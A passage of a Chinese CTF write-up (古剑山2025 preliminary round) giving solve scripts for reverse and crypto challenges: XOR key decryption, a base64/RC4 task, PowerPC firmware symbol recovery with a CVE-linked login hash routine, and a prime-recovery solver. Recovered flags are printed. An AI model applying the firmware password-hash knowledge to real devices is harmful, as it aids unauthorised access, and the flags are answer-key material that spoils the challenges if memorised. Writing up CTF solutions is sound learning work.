class="line">    <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x2E</span>,</span><br><span class="line">    <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x11</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># --- 核心解密逻辑 ---</span></span><br><span class="line"></span><br><span class="line">EXPECTED_LEN = <span class="number">0x2F</span>  <span class="comment"># 47</span></span><br><span class="line">FLAG_CHARS = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(KEY_DATA_1) != EXPECTED_LEN:</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">f&quot;错误：主密钥长度应为 <span class="subst">&#123;EXPECTED_LEN&#125;</span> 字节，但提供了 <span class="subst">&#123;<span class="built_in">len</span>(KEY_DATA_1)&#125;</span> 字节。&quot;</span></span><br><span class="line">    )</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(KEY_DATA_2) != <span class="number">8</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;错误：循环密钥长度应为 8 字节，但提供了 <span class="subst">&#123;<span class="built_in">len</span>(KEY_DATA_2)&#125;</span> 字节。&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;--- 正在生成 <span class="subst">&#123;EXPECTED_LEN&#125;</span> 字节的 Flag/Key ---&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(EXPECTED_LEN):</span><br><span class="line">    <span class="comment"># 1. 获取主密钥字节 C1: KeyData_1[i]</span></span><br><span class="line">    C1 = KEY_DATA_1[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取循环密钥字节 C2: KeyData_2[i &amp; 7]</span></span><br><span class="line">    C2_index = i &amp; <span class="number">0x7</span>  <span class="comment"># i % 8</span></span><br><span class="line">    C2 = KEY_DATA_2[C2_index]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 计算目标字符: V = C1 ^ C2</span></span><br><span class="line">    <span class="comment"># Flag[i] = V</span></span><br><span class="line">    Target_Char_Value = C1 ^ C2</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将 ASCII 值转换为字符</span></span><br><span class="line">    Target_Char = <span class="built_in">chr</span>(Target_Char_Value)</span><br><span class="line">    FLAG_CHARS.append(Target_Char)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印进度 (可选)</span></span><br><span class="line">    <span class="comment"># print(f&quot;i=&#123;i:02d&#125;: C1=0x&#123;C1:02X&#125;, C2=0x&#123;C2:02X&#125; (Idx=&#123;C2_index&#125;), Flag Char=0x&#123;Target_Char_Value:02X&#125; (&#x27;&#123;Target_Char&#125;&#x27;)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接并输出最终结果</span></span><br><span class="line">generated_flag = <span class="string">&quot;&quot;</span>.join(FLAG_CHARS)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✅ 生成的 Flag/Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(generated_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;07d3766227718d8094bd@1f2bcd08ca0acccb5a1c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="easyre">easyre</h3>
<p>base64编码，RC4，再异或，根据v7的符号，决定是否异或22</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/202511291216650.png"
alt="image-20251129121642576" />
<figcaption aria-hidden="true">image-20251129121642576</figcaption>
</figure>
<p>这里Xor 22根据结果可能有，可能没有</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/202511291213565.png"
alt="image-20251129121348454" />
<figcaption aria-hidden="true">image-20251129121348454</figcaption>
</figure>
<p>根据结果能不能base64解密进行拼凑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tlYjM1NjRmODlzZjQ1YjI0b2FjMTJkYjhlY30=8bàû</span><br><span class="line">ZmxhxVN&#123;HolHpOmfNXZjQ1YjI0b2FjovhI&#123;HJNY30=8bàû</span><br><span class="line">xOZJZ3tlYjM1NjRmODlzxHs&#123;Hk@dHMTJkYjhl&#123;@ÂÙ</span><br></pre></td></tr></table></figure>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/202511291215371.png"
alt="image-20251129121526246" />
<figcaption aria-hidden="true">image-20251129121526246</figcaption>
</figure>
<h3 id="final">final</h3>
<p>固件逆向，使用PPC BigEnd打开</p>
<p><img src="https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/202511291249721.png" alt="image-20251129124159518" style="zoom:50%;" /></p>
<p>idapython脚本恢复符号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"><span class="keyword">import</span> ida_nalt</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">import</span> idc <span class="comment"># 引入 idc 以便使用 print_console</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 符号表配置 ---</span></span><br><span class="line">symbol_interval = <span class="number">16</span></span><br><span class="line">load_address = <span class="number">0x10000</span></span><br><span class="line"><span class="comment"># 确保这些地址是正确的，它们应该是加载后的VA (Virtual Address)</span></span><br><span class="line">symbol_table_start = <span class="number">0x301e60</span> + load_address</span><br><span class="line">symbol_table_end = <span class="number">0x3293b0</span> + load_address</span><br><span class="line"><span class="comment"># --------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_symbol_table</span>(<span class="params">start_ea, end_ea, interval</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    遍历自定义符号表，并根据表项创建函数和设置名称。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        start_ea (int): 符号表的起始地址。</span></span><br><span class="line"><span class="string">        end_ea (int): 符号表的结束地址。</span></span><br><span class="line"><span class="string">        interval (int): 每个符号表项的间隔大小（字节）。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    current_ea = start_ea</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    ida_idaapi.show_wait_box(<span class="string">&quot;Processing custom symbol table...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print_console(<span class="string">f&quot;--- 🚀 开始处理符号表：0x<span class="subst">&#123;start_ea:X&#125;</span> 到 0x<span class="subst">&#123;end_ea:X&#125;</span> ---&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> current_ea &lt; end_ea:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 假设表项结构是：[?] [name_ptr] [func_ptr] [?] (共16字节)</span></span><br><span class="line">            <span class="comment"># 名字指针偏移：4 字节</span></span><br><span class="line">            name_ptr_addr = current_ea + <span class="number">4</span></span><br><span class="line">            <span class="comment"># 函数地址偏移：8 字节</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># **注意：使用 get_dword 假设目标文件是 32 位。**</span></span><br><span class="line">            <span class="comment"># **如果是 64 位文件，应使用 ida_bytes.get_qword。**</span></span><br><span class="line">            name_ea = ida_bytes.get_dword(name_ptr_addr)</span><br><span class="line">            </span><br><span class="line">            func_ptr_addr = current_ea + <span class="number">8</span></span><br><span class="line">            func_ea = ida_bytes.get_dword(func_ptr_addr)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查 name_ea 是否有效（非NULL，非FFFFFFFF）</span></span><br><span class="line">            <span class="keyword">if</span> name_ea <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>):</span><br><span class="line">                <span class="comment"># 1. 创建字符串并获取内容</span></span><br><span class="line">                <span class="comment"># 尝试创建字符串，长度设置为0表示自动检测</span></span><br><span class="line">                ida_bytes.create_strlit(name_ea, <span class="number">0</span>, ida_nalt.STRTYPE_C)</span><br><span class="line">                raw_name = ida_bytes.get_strlit_contents(name_ea, -<span class="number">1</span>, ida_nalt.STRTYPE_C)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> raw_name:</span><br><span class="line">                    <span class="comment"># 2. 解码名称</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="comment"># 尝试 UTF-8 解码</span></span><br><span class="line">                        func_name = raw_name.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        <span class="comment"># 失败后使用 Latin-1 (或其他适合的编码)</span></span><br><span class="line">                        func_name = raw_name.decode(<span class="string">&#x27;latin-1&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 清理名称以确保在 IDA 中有效 (例如，移除空格或非法字符)</span></span><br><span class="line">                    func_name = func_name.strip()</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 3. 创建函数并设置名称</span></span><br><span class="line">                    <span class="keyword">if</span> func_ea <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="keyword">and</span> func_name:</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 尝试在 func_ea 处创建指令（确保它是代码）</span></span><br><span class="line">                        <span class="comment"># 并在其上创建函数</span></span><br><span class="line">                        ida_ua.create_insn(func_ea)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 创建函数</span></span><br><span class="line">                        <span class="keyword">if</span> ida_funcs.add_func(func_ea):</span><br><span class="line">                            <span class="comment"># 成功创建函数后设置名称</span></span><br><span class="line">                            ida_name.set_name(</span><br><span class="line">                                func_ea, </span><br><span class="line">                                func_name, </span><br><span class="line">                                ida_name.SN_NOWARN | ida_name.SN_FORCE</span><br><span class="line">                            )</span><br><span class="line">                            count += <span class="number">1</span></span><br><span class="line">                            <span class="comment"># print_console(f&quot;✅ 成功命名并创建函数：0x&#123;func_ea:X&#125; -&gt; &#123;func_name&#125;&quot;)</span></span><br><span class="line">                        <span class="comment"># else:</span></span><br><span class="line">                            <span class="comment"># print_console(f&quot;⚠️ 无法在 0x&#123;func_ea:X&#125; 创建函数 (可能已存在或不是代码)&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print_console(<span class="string">f&quot;❌ 处理地址 0x<span class="subst">&#123;current_ea:X&#125;</span> 时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        current_ea += interval</span><br><span class="line">        <span class="keyword">if</span> (current_ea - start_ea) % (interval * <span class="number">100</span>) == <span class="number">0</span>:</span><br><span class="line">             <span class="comment"># 每处理100个表项更新一次进度条</span></span><br><span class="line">             ida_idaapi.replace_wait_box(<span class="string">f&quot;Processed <span class="subst">&#123;count&#125;</span> functions. Current address: 0x<span class="subst">&#123;current_ea:X&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ida_idaapi.hide_wait_box()</span><br><span class="line">    print_console(<span class="string">f&quot;--- 🎉 符号表处理完成。共成功处理并命名了 <span class="subst">&#123;count&#125;</span> 个函数。 ---&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 执行函数 ---</span></span><br><span class="line"><span class="comment"># 确保在 IDA Pro 中运行此脚本</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 检查 IDA 是否正在处理文件</span></span><br><span class="line">    <span class="keyword">if</span> ida_idaapi.is_idaq():</span><br><span class="line">        process_symbol_table(symbol_table_start, symbol_table_end, symbol_interval)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请在 IDA Pro 环境中运行此脚本。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>找到CVE对应漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loginDefaultEncrypt</span><span class="params">(<span class="type">char</span> *in, <span class="type">char</span> *out)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4;             <span class="comment">// r29</span></span><br><span class="line">    <span class="type">int</span> i;              <span class="comment">// r30</span></span><br><span class="line">    <span class="type">int</span> v7;             <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8;    <span class="comment">// r30</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n0x32; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n0x35; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n0x38; <span class="comment">// r0</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(in); v4 += v7 ^ i)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = in[i] * (i + <span class="number">2</span>);</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(out, <span class="string">&quot;%u&quot;</span>, <span class="number">0x1E3A1D5</span> * v4);</span><br><span class="line">    <span class="keyword">while</span> (v8 &lt; <span class="built_in">strlen</span>(out))</span><br><span class="line">    &#123;</span><br><span class="line">        n0x32 = *out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n0x32 &lt;= <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            *out = n0x32 + <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        n0x35 = *out;</span><br><span class="line">        <span class="keyword">if</span> (n0x35 &lt;= <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">            *out = n0x35 + <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        n0x38 = *out;</span><br><span class="line">        <span class="keyword">if</span> (n0x38 &lt;= <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">            *out = n0x38 + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        ++out;</span><br><span class="line">        ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>input为SimpleXue，输出：SQbcQSScQc</p>
<p>flag：flag{SQbcQSScQc}</p>
<h2 id="crypto">Crypto</h2>
<h3 id="sol">sol</h3>
<p>AI一把梭了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加 Python 整数的递归深度限制以处理大数</span></span><br><span class="line">sys.setrecursionlimit(<span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数值</span></span><br><span class="line">Y = <span class="number">198522960435841482189432265177909868426431703074708363449219028697324701510160286719731988116839697036160581630187160949885168801231636762705713983033164840216512010109089390010468198557792366011939222563881564708155342114969230636341034212421633874868858789397938243061335664034978831542864101231007091988193863118052712382091154270467198016237288512835005671248249864343182623298497353279333896185090300689372993251851698985725825619040354352099701531339567909888327001736937441117830890673409609636796619930226667955511073115983145641056494143455805357766933615911269415380543240132925744315363193308341329870002528062545716167903459438493154302274735882612908825416096548207130441684370171413794313131775960498691561791175984389699661776179746486882233034632979256741127422204726199986374102650551713456275685579171314911783130052174900534533297618292233601037654694611306838303066884626125878765611689352475739052132349596965687310082111652949904102268706219733830038063864703811394198182986558883397487207721093367621647038297033723455527107418011037322197091733780060565430632034276705456268207898108856563488519654411483838153783153351440293627133844440601677480833571012370843618968387929873540183054860492446381685034534436</span></span><br><span class="line">B = <span class="number">174037789483961573123221843591212086149338262121485604600830887974881925500571571986993457692950300053374733237615433793104052491813933671943903946487842930332507742237430616633825365722075237337670353892075697891908329460336348924680104502864021820883975695834115061923434753902679746280494899854826747016131</span></span><br><span class="line">C = <span class="number">33472511251772997775575923606329341691183359500908766818057589728522254242596438955590397842265158831677351198820346034459567637818737702918129437591421137895764213815168420429024803177742927091662422333575499875132388315943460516679655107714170719351306979285358080183600281172752401859701765071852769889627868633217209348758684870450300228084878260106253395883903968044935866937201968348531962567937222914516096107266208665856669507873113157476771707</span></span><br><span class="line">P = <span class="number">3634071908867506965069315261429753443464716245738410040251875581513557838289276325218462157875991826224641777953866288921260305341272244121296068932207702190214606897491230548638292125061653257219859677992258434311277440482616823776560279337140379719082621412099620617217597998553091192312010588644683350990634085010622936842730027266359749795759745712453727285078472696717945991398633345949433118817923844577431455021644322229917758424788807006347476518982567210018019855197933776595555771047454297485885425728424948978147686731066201483794340469411549870237470492555193178687911573753715584786785924202386461</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 1. 估算 X (四次方根) ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用整数四次方根来估计 X</span></span><br><span class="line">x_approx = isqrt(isqrt(Y))  <span class="comment"># isqrt = integer square root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;y的位数: <span class="subst">&#123;Y.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x的预期位数: 1024 bits&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;X的近似值位数: <span class="subst">&#123;x_approx.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 2. 构造函数并寻找整数根 ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标函数 P(x) = x^4 + a*x^2 + b*x + c - y = 0</span></span><br><span class="line"><span class="comment"># 由于 a 存在，我们不能直接解出 P(x)=0 的根。</span></span><br><span class="line"><span class="comment"># 但是，我们可以利用 x 是一个整数（且是素数）的事实，</span></span><br><span class="line"><span class="comment"># 并且 x_approx 应该非常接近 x。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们将 P(x) 简化为只包含 x 的部分，并求出剩余的 (a*x^2)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_a</span>(<span class="params">x_val</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据假设的 x 值计算出 a 的值。&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Target_Term = a * x^2</span></span><br><span class="line">    target_term = Y - (x_val**<span class="number">4</span> + B * x_val + C)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x_val == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    x_sq = x_val**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 target_term 是否能被 x^2 整除 (a 必须是整数)</span></span><br><span class="line">    <span class="keyword">if</span> target_term % x_sq != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    a_val = target_term // x_sq</span><br><span class="line">    <span class="keyword">return</span> a_val, target_term</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在近似值 x_approx 附近进行搜索，寻找满足以下两个条件的整数 x：</span></span><br><span class="line"><span class="comment"># 1. x 必须是素数 (getPrime(1024))</span></span><br><span class="line"><span class="comment"># 2. 计算出的 a 必须是一个整数 (y - x^4 - b*x - c) % x^2 == 0</span></span><br><span class="line"><span class="comment"># 3. 计算出的 a 必须是 512 bit 的素数 (getPrime(512))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索范围: 从 x_approx 开始，向上下微调</span></span><br><span class="line"><span class="comment"># 由于 x^4 是主导项，x_approx 应该非常接近 x</span></span><br><span class="line">SEARCH_RANGE = <span class="number">1000</span>  <span class="comment"># 搜索范围，1000 个整数应该足够</span></span><br><span class="line"></span><br><span class="line">found_x = <span class="literal">None</span></span><br><span class="line">found_a = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先检查 x_approx 本身</span></span><br><span class="line"><span class="comment"># for i in range(-SEARCH_RANGE, SEARCH_RANGE):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">10000</span>, <span class="number">10000</span>):  <span class="comment"># 扩大搜索范围，以防初始估计有偏差</span></span><br><span class="line">    x_candidate = x_approx + i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x_candidate &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 优化: 检查 x_candidate 是否为素数 (减少后续大数运算)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isPrime(x_candidate):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试计算 a</span></span><br><span class="line">    a_candidate, target_term = find_a(x_candidate)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> a_candidate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 找到整数 a，现在检查 a 的位数和素性</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 检查 a 的位数是否大约 512 bits</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">2</span>**<span class="number">511</span> &lt;= a_candidate &lt; <span class="number">2</span>**<span class="number">512</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 2. 检查 a 是否为素数</span></span><br><span class="line">            <span class="comment"># 这里的 isPrime 可能是瓶颈，但必须检查</span></span><br><span class="line">            <span class="keyword">if</span> isPrime(a_candidate):</span><br><span class="line">                found_x = x_candidate</span><br><span class="line">                found_a = a_candidate</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;--- 找到解！ ---&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;找到的 X (1024-bit prime): <span class="subst">&#123;found_x.bit_length()&#125;</span> bits&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;找到的 A (512-bit prime): <span class="subst">&#123;found_a.bit_length()&#125;</span> bits&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;搜索次数 i = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 3. 计算 Flag ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> found_a <span class="keyword">is</span> <span 